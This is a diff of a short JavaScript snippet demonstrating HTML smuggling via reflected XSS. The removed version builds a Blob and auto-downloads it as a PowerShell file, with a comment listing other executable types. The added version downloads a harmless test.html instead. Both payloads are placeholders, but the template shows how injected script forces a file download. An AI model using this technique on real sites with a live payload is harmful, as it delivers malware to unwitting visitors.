@@ -1,18 +1,14 @@
-const payload = `
-Write-Output "PoC for HTML Smuggling via RXSS";
-`;
+<script>
+const blob = new Blob(
+  ["<h1>This is a test file</h1>"], 
+  { type: "text/html" }
+);
 
-// ساخت Blob
-const blob = new Blob([payload], { type: "application/octet-stream" });
-
-// ساخت URL
 const url = URL.createObjectURL(blob);
 
-// ساخت لینک دانلود
 const a = document.createElement("a");
 a.href = url;
-a.download = "poc.ps1";   // نوع فایل: ps1, reg, bat, lnk, js
+a.download = "test.html";
 document.body.appendChild(a);
-
-// اجرای دانلود اتومات
 a.click();
+</script>
